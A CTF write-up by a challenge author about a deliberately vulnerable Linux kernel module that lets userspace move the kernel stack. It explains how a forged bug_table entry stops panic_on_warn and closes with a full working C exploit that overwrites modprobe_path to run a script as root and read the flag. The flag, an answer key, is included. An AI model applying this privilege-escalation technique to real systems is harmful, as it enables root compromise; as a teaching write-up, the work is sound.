# [CTF-0X01] Linux bug_tables and a word about beating Dio

> TL;DR: fake a `bug_entry` in the `bug_table` to mark the entry for the `bugaddr` as “done” so it returns early without triggering a call to `warn()`. Then overwrite modprobe or something similar. Keep reading if you want to learn why the challenge is called "za warudo" :)

After getting bodied hard in a [kernel challenge](https://kqx.io/writeups/baby_smallest) over the weekend (and losing my sanity in the process), I later found out that one of the solves was written by an LLM (thank you @zerokiral for sharing the exploit when you saw my cries in `Sunglasses 😎`). So I decided to analyze its (unintended) solution and that’s how this challenge was born.


I created it for AcademyCTF 2026, an internal CTF for the mentees, by the mentees. Huge thanks to @x3ero0 for organizing it <3

## 0x00. An unfortune encounter

The challenge was meant to be easy (no KASLR and pretty straight forward), with the goal of teaching new things about the kernel. I used almost the same kernel module from the original challenge with a minimal change, because the way `gs` is accessed has changed in newer kernel versions (thank you @leave for explaining).

So here’s the only code that I changed which actually matters in the module:

> the challenge is in [here](github.com), try it yourself!

```C
static long dev_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
    asm volatile (
        ".intel_syntax noprefix\n"
        "cli\n"                     // no funny business while in kernelspace
        ".att_syntax prefix\n"
        :
        :
        :
    );
    // use your stand
    this_cpu_write(cpu_current_top_of_stack, arg);
    // now its Dio's turn
    return 0;
}
```
> ["cli"](https://www.felixcloutier.com/x86/cli) because we almost always immediately get interrupted while still executing in kernelspace. hence it doesn't save user registers and making it impossible to exploit. (unlesss someone finds a way... lmk in that case!)

The kernel module lets us set `cpu_current_top_of_stack` to an arbitrary value. However the kernel immediately crashes after returning from the ioctl due to `panic_on_warn=1`.

If you run it with a somewhat proper address (remember no KASLR) you will get the following panic:

<center>
<img src=/blog/actf/pics/dio-useless.gif>
</center>

<img src=/blog/actf/pics/panic_on_warn2.png>


## 0x01. Reasoning about the panic

How do we reason about this? We don’t know exactly what’s happening, but we do know the kernel is triggering `panic_on_warn` due to a warning. That’s where the hint in the challenge description comes in handy:

***“Dio has fallen you into his trap. Can you still beat him with your stand?”***

If you take a look at [arch/x86/kernel/traps.c](https://elixir.bootlin.com/linux/v7.0/source/arch/x86/kernel/traps.c), warnings/bugs are handled via [handle_bug()](https://elixir.bootlin.com/linux/v7.0/source/arch/x86/kernel/traps.c#L400). It decodes the bug (ud1/ud2/udb/lock) and handles them based on type. In our case it calls `report_bug()` and sets `handled = true` if the trap type is `BUG_TRAP_TYPE_WARN`.

Inside [report_bug()](https://elixir.bootlin.com/linux/v7.0/source/lib/bug.c#L272), there’s a call to `warn_rcu_enter()` (not relevant here), followed by `__report_bug(NULL, bugaddr, regs)`. This function inspects `bugaddr` to determine what caused the trap.

[__report_bug()](https://elixir.bootlin.com/linux/v7.0/source/lib/bug.c#L197) checks whether the address is valid and calls [find_bug()](https://elixir.bootlin.com/linux/v7.0/source/lib/bug.c#L165), a simple loop to locate the corresponding `bug_entry:`

```C
struct bug_entry *find_bug(unsigned long bugaddr)
{
    struct bug_entry *bug;

    for (bug = __start___bug_table; bug < __stop___bug_table; ++bug)
        if (bugaddr == bug_addr(bug))
            return bug;

    return module_find_bug(bugaddr);
}
```

A `bug_entry` is 0x10 bytes and contains bug_addr, format, file, and flags. Because `CONFIG_GENERIC_BUG_RELATIVE_POINTERS` is enabled, `bug_addr` is stored as a relative displacement. The [calculation](https://elixir.bootlin.com/linux/v7.0/source/lib/bug.c#L57) is:

```C
   56   #ifdef CONFIG_GENERIC_BUG_RELATIVE_POINTERS
 ->  57         return (unsigned long)&bug->bug_addr_disp + bug->bug_addr_disp;
     58   #else
     59         return bug->bug_addr;
```

So it adds the address of the `bug_entry` to the displacement. Cool.

Once a matching entry is found, [__report_bug()](https://elixir.bootlin.com/linux/v7.0/source/lib/bug.c#L223) checks its flags:

```C
(...)
warning  = bug->flags & BUGFLAG_WARNING;
once     = bug->flags & BUGFLAG_ONCE;
done     = bug->flags & BUGFLAG_DONE;
no_cut   = bug->flags & BUGFLAG_NO_CUT_HERE;
has_args = bug->flags & BUGFLAG_ARGS;

if (warning && once) {
        if (done)
            return BUG_TRAP_TYPE_WARN;

        /*
         * Since this is the only store, concurrency is not an issue.
         */
        bug->flags |= BUGFLAG_DONE;
    }
(...)
```

If the done flag is already set it returns early, which means no warn() or no panic!!!

So our goal is clear: set the done flag in the corresponding `bug_entry`. But how? How did we end up in here anyway? What caused the trap in the first place? It is finally time to reveal the mystery behind the challenge's name :)

## 0x02. Where does the Trap come from? (KONO DIO DA!)

To understand what triggers the trap, set a breakpoint at `report_bug` and inspect `bugaddr`. You'll probably see two call sites on different runs:

```asm
gef> x/2i 0xffffffff822eddb7
    0xffffffff822eddb7 <irqentry_enter+151>:     ud2
    0xffffffff822eddb9 <irqentry_enter+153>:     nop

gef> x/2i 0xffffffff822e88d9
   0xffffffff822e88d9 <do_syscall_64+1017>:     ud2
   0xffffffff822e88db <do_syscall_64+1019>:     nop
```

Both are `ud2`, confirming what we saw earlier in `handle_bug`. Now if we use the amazing `bt`(back trace) command:

```asm
gef> bt
#0  0xffffffff822eddb7 in arch_enter_from_user_mode (regs=0xffffffff8386df58 <__brk_early_pgt_alloc+24408>)
    at ./arch/x86/include/asm/entry-common.h:43
#1  enter_from_user_mode (regs=0xffffffff8386df58 <__brk_early_pgt_alloc+24408>) at ./include/linux/irq-entry-common.h:91
#2  irqentry_enter_from_user_mode (regs=0xffffffff8386df58 <__brk_early_pgt_alloc+24408>)
    at ./include/linux/irq-entry-common.h:319
#3  irqentry_enter (regs=regs@entry=0xffffffff8386df58 <__brk_early_pgt_alloc+24408>) at kernel/entry/common.c:113
#4  0xffffffff822ed3ee in sysvec_apic_timer_interrupt (regs=0xffffffff8386df58 <__brk_early_pgt_alloc+24408>)
    at arch/x86/kernel/apic/apic.c:1058
#5  0xffffffff8100148a in asm_sysvec_apic_timer_interrupt () at ./arch/x86/include/asm/idtentry.h:697
#6  0x00000000004ae120 in ?? ()
#7  0x0000000000000002 in ?? ()
#8  0x00007ffe0e430228 in ?? ()
#9  0x00007ffe0e430218 in ?? ()
#10 0x00007ffe0e4300d0 in ?? ()
#11 0x0000000000000001 in ?? ()
#12 0x0000000000000246 in ?? ()
#13 0x0000000000000000 in ?? ()
```

It reveals that we have triggered the trap for `irqentry_enter` from a `timer interrupt!`. Is that you, Dio?!

<center> <img src=/blog/actf/pics/dio-za-warudo.gif></center>

> For those unaware: Za warudo (aka The World) is Dio's Stand, and it can halt everything by stopping time. Somewhat like the timer interrupt pausing normal execution :p  

To see what caused the execution flow into the trap (set by Dio), we can check the [source code line](https://elixir.bootlin.com/linux/v7.0/source/arch/x86/include/asm/entry-common.h#L43) printed in `bt`

```C
/* Check that the stack and regs on entry from user mode are sane. */
static __always_inline void arch_enter_from_user_mode(struct pt_regs *regs)
{       (...)
		/*
		 * All entries from user mode (except #DF) should be on the
		 * normal thread stack and should have user pt_regs in the
		 * correct location.
		 */
		WARN_ON_ONCE(!on_thread_stack());
		WARN_ON_ONCE(regs != task_pt_regs(current));
	}
}
```

We see that we fail on `WARN_ON_ONCE(regs != task_pt_regs(current));`. It basically compares our `regs` (pt_regs) to the `pt_regs` from the current thread via the `task_pt_regs` macro. What is `pt_regs` anyway?

```asm
SYM_CODE_START(entry_SYSCALL_64)
	UNWIND_HINT_ENTRY
	ENDBR

	swapgs
	/* tss.sp2 is scratch space. */
	movq	%rsp, PER_CPU_VAR(cpu_tss_rw + TSS_sp2)
	SWITCH_TO_KERNEL_CR3 scratch_reg=%rsp
	movq	PER_CPU_VAR(cpu_current_top_of_stack), %rsp

SYM_INNER_LABEL(entry_SYSCALL_64_safe_stack, SYM_L_GLOBAL)
	ANNOTATE_NOENDBR

	/* Construct struct pt_regs on stack */
	pushq	$__USER_DS				/* pt_regs->ss */
	pushq	PER_CPU_VAR(cpu_tss_rw + TSS_sp2)	/* pt_regs->sp */
	pushq	%r11					/* pt_regs->flags */
	pushq	$__USER_CS				/* pt_regs->cs */
	pushq	%rcx					/* pt_regs->ip */
SYM_INNER_LABEL(entry_SYSCALL_64_after_hwframe, SYM_L_GLOBAL)
	pushq	%rax					/* pt_regs->orig_ax */

	PUSH_AND_CLEAR_REGS rax=$-ENOSYS

	/* IRQs are off. */
	movq	%rsp, %rdi
	/* Sign extend the lower 32bit as syscall numbers are treated as int */
	movslq	%eax, %rsi

	/* clobbers %rax, make sure it is after saving the syscall nr */
	IBRS_ENTER
	UNTRAIN_RET
	CLEAR_BRANCH_HISTORY

	call	do_syscall_64		/* returns with IRQs disabled */
    (...)

```

When a call to a syscall is made, the `entry_SYSCALL_64` routine starts. After swapping `gs` to the `kernel gs` and switching to the kernel stack it pushes the user registers onto the stack to save them via `pt_regs`. and finally the call to `do_syscall_64` is made. The kernel module exactly lets us change the kernel stack for the current thread, which means we effectively control where `pt_regs` is stored.

Btw, what about the other trap?

```asm
gef> bt
#0  0xffffffff822e88d9 in arch_enter_from_user_mode (regs=0xffffffff82eef448) at ./arch/x86/include/asm/entry-common.h:43
#1  enter_from_user_mode (regs=0xffffffff82eef448) at ./include/linux/irq-entry-common.h:91
#2  syscall_enter_from_user_mode (regs=0xffffffff82eef448, syscall=0x1) at ./include/linux/entry-common.h:183
#3  do_syscall_64 (regs=0xffffffff82eef448, nr=0x1) at arch/x86/entry/syscall_64.c:90
#4  0xffffffff81000130 in entry_SYSCALL_64 () at arch/x86/entry/entry_64.S:121
#5  0x6555555555555555 in ?? ()
#6  0x0000000023dae610 in ?? ()
#7  0x000000000000001c in ?? ()
#8  0x000000000000001c in ?? ()
#9  0x00007ffd71b1a2d0 in ?? ()
#10 0x00000000004b2300 in ?? ()
#11 0x0000000000000202 in ?? ()
#12 0x0000000000000000 in ?? ()
```

This one is triggered via a syscall rather than an interrupt. But the rest is the same.

So we control where pt_regs is stored. We can confirm this by setting a hardware watchpoint on our target address. We're getting a little nastier with gdb: `awatch *(unsigned long*)target`

> The careful reader may have already noticed that in almost all trap-handling and interrupt paths, we use pt_regs.

When we run our code again, the execution breaks in `sync_regs` in `asm_sysvec_apic_timer_interrupt`:

```C
#ifdef CONFIG_X86_64
/*
 * Help handler running on a per-cpu (IST or entry trampoline) stack
 * to switch to the normal thread stack if the interrupted code was in
 * user mode. The actual stack switch is done in entry_64.S
 */
asmlinkage __visible noinstr struct pt_regs *sync_regs(struct pt_regs *eregs)
{
	struct pt_regs *regs = (struct pt_regs *)current_top_of_stack() - 1;
	if (regs != eregs)
		*regs = *eregs;
	return regs;
}
```
This copies our registers to our controlled memory. And by setting our registers beforehand ([inline assembly fun](https://www.felixcloutier.com/documents/gcc-asm.html)), we can write those values to a controlled memory location. But we trigger a panic afterwards. So it looks like our "stand" (primitive) is actually powerful that is yet to achieve its full potential.

> Just a heads up, it does not call `sync_regs` in the `do_syscall_64` trap call flow. Either you can pray for a timer interrupt before a syscall happens, or, you can make an infinite loop right after the ioctl call to block the syscalls for that thread.


## 0x03. Activating our stand’s full potential

Now that we have unraveled the mystery of Dio's trap, we can make a plan:

- Use the first trigger to overwrite a fake `bug_entry`.

> when handling the interrupt/bug, the call flow must include sync_regs() at some point. otherwise your registers won’t be written. that’s why we want to be interrupted by the timer instead of do_syscall_64.

- Place it at `__start___bug_table` so it’s found first.

- Set correct `bug_addr_disp` and the flags so that the bug_entry is marked as "done"

Macros for the flags are defined [here](https://elixir.bootlin.com/linux/v7.0/source/include/asm-generic/bug.h#L11) as:

```C
#ifdef CONFIG_GENERIC_BUG
#define BUGFLAG_WARNING		(1 << 0)
#define BUGFLAG_ONCE		(1 << 1)
#define BUGFLAG_DONE		(1 << 2)
#define BUGFLAG_NO_CUT_HERE	(1 << 3)	/* CUT_HERE already sent */
#define BUGFLAG_ARGS		(1 << 4)
#define BUGFLAG_TAINT(taint)	((taint) << 8)
#define BUG_GET_TAINT(bug)	((bug)->flags >> 8)
#endif
```

We want warning + once + done = which is 0x7. And reversing the `bugaddr` formula from earlier gives us: `addr_disp = bugaddr - &bug_entry`

So once we set those correctly in our registers, when `find_bug()` runs it hits our fake entry first. Since DONE is set, it returns early, no warning means no panic.

At this point we effectively have an arbitrary write primitive in the kernel without triggering a panic. From here you can overwrite modprobe_path, core_pattern or the cred struct and such... But you might need to fake a few more bug entries (e.g, in `__alloc_frozen_pages_noprof` or `___ratelimit`. depends on what you're doing).

## 0x04. Beating Dio

An outstanding stand user (blue belt) got the 🩸 and solved the challenge within a few days. Much congrats to [whoami_mr_x!](https://pwn.college/hacker/121187), they were the only one who managed to beat Dio.

They did ... bla bla exploit details 

<center>
<img src=/blog/actf/pics/dio-wine.gif>
<p>Here's the full exploit:</p>
</center>


```C
#define _GNU_SOURCE
#include <sys/ioctl.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>

#include <sys/sendfile.h>
#include <sys/resource.h>
#include <sys/stat.h>

#include <sys/socket.h>
#include <linux/if_alg.h>


typedef unsigned long long int u64;
// for inline assembly
volatile u64 asm_fd;
volatile u64 asm_child_fd;
volatile u64 asm_target;
volatile u64 asm_child_target;

volatile u64 MODPROBE_QWORD0;
volatile u64 MODPROBE_QWORD1;
volatile u64 MODPROBE_QWORD2;

#define MODPROBE 0xffffffff82f4aec0

// small delay without calling a syscall (sleep)
static void small_delay(unsigned long n) {
    for (volatile unsigned long i = 0; i < n; i++) {
        asm volatile("pause" ::: "memory");
    }
}

// dont forget to change the paths for your environment 
void make_modprobe_script(void) {
    int fd = open("/home/user/y", O_WRONLY | O_CREAT | O_TRUNC, 0777);
    if (fd < 0) return;

    const char script[] =
        "#!/bin/sh\n"
        "chmod 777 /flag\n";

    write(fd, script, sizeof(script) - 1);
    close(fd);

    chmod("/home/user/y", 0777);
}

void make_binfmt_trigger(void) {
    int fd = open("/home/user/x", O_WRONLY | O_CREAT | O_TRUNC, 0777);
    if (fd >= 0) {
        static const unsigned char bad[] = { 0xff, 0xff, 0xff, 0xff, '\n' };
        write(fd, bad, sizeof(bad));
        close(fd);
        chmod("/home/user/x", 0777);
    }
}

// overwrites modprobe path
void child_irq_writer(){
    int child_fd = open("/dev/jojo", 0644, 0);
    asm_child_target = MODPROBE + 0xa8;
    asm_child_fd = (u64) child_fd;

    MODPROBE_QWORD0 = 0x73752f656d6f682f;
    MODPROBE_QWORD1 = 0x00000000792f7265;

    asm volatile(
        "movq MODPROBE_QWORD1(%%rip), %%r14\n"
        "movq MODPROBE_QWORD0(%%rip), %%r15\n"
        "xor %%r8, %%r8\n"
        "xor %%r9, %%r9\n"
        "xor %%r10, %%r10\n"
        "xor %%r11, %%r11\n"
        "xor %%r12, %%r12\n"
        "xor %%r13, %%r13\n"
        "movq asm_child_fd(%%rip), %%rdi\n"
        "movq asm_child_target(%%rip), %%rdx\n"
        "mov $16, %%eax\n"
        "syscall\n"
        "1:\n"
        "pause\n"
        "jmp 1b\n"
        :
        :
        : "rax","rbx","rcx","rdx","rdi","rsi",
      "r8","r9","r10","r11","r12","r13","r14","r15","memory"
      );
}


void read_flag(){
    int fd_f;
    fd_f = open("/flag", O_RDONLY);
    if (fd_f == -1)
        puts("failed");
    sendfile(1, fd_f, NULL, 0x50);
}

// trigger alg_bind -> request_module
int trigger(){
        int alg_fd = socket(AF_ALG, SOCK_SEQPACKET, 0);
        struct sockaddr_alg sa;
        if (alg_fd < 0) {
                perror("socket(AF_ALG) failed");
                return 1;
        }

        memset(&sa, 0, sizeof(sa));
        sa.salg_family = AF_ALG;
        strcpy((char *)sa.salg_type, "peroperopero");
        bind(alg_fd, (struct sockaddr *)&sa, sizeof(sa));
        return 0;
}

int child_stage(){
    small_delay(2000000);
    puts("child is running\n");
    pid_t pid3 = fork();
    if (pid3 == 0) {
        small_delay(10000); // make sure its done overwriting modprobe
        trigger();
        read_flag();
        _exit(0);
    }
    child_irq_writer();
    _exit(0);
}

int main(){
    // modprobe set up
    make_modprobe_script();
    make_binfmt_trigger();
    int fd = open("/dev/jojo", 0644, 0);
    asm_fd = (u64) fd;

    // child overwrites modprobe, triggers binfmt and reads the flag to stdout
    pid_t pid = fork();
    if (pid == 0) {
        child_stage();
    }
    // parent fakes a bug_entry in the bug_table to mark the entry for the irqentry_enter+151 (ud2) as "done".
    // so it returs early without triggering a call to warn().
    u64 target = 0xffffffff830ef3c0 + 0xa8; // ___start____bug_table, 0xa8 is the offset for r15
    asm_target = target;

    asm volatile(
        "xor %%r10, %%r10\n"
        "xor %%r11, %%r11\n"
        "xor %%r12, %%r12\n"
        "xor %%r13, %%r13\n"
        "movabs $0x0007000044444444, %%r14\n"   // mark the bug_entry for irqentry_enter+151 as done.
        "movabs $0x00000000ff3060b7, %%r15\n"
        "movq asm_fd(%%rip), %%rdi\n"
        "movq asm_target(%%rip), %%rdx\n"
        "mov $16, %%eax\n"
        "syscall\n"
        "1:\n"
        "pause\n"
        "jmp 1b\n" // block execution so it does not call do_syscall_64
                   // you can also mark the bug_entry for do_syscall_64+0x3f9 as done too
        :
        :
        : "rax","rbx","rcx","rdx","rdi","rsi",
      "r8","r9","r10","r11","r12","r13","r14","r15","memory"
    );
    return 0;
    // FLAG: CTFA{w4rn1ngs_4r3_jus7_sugg3st10ns-n3v3r-p4n1c-0n-th3m}
}
```
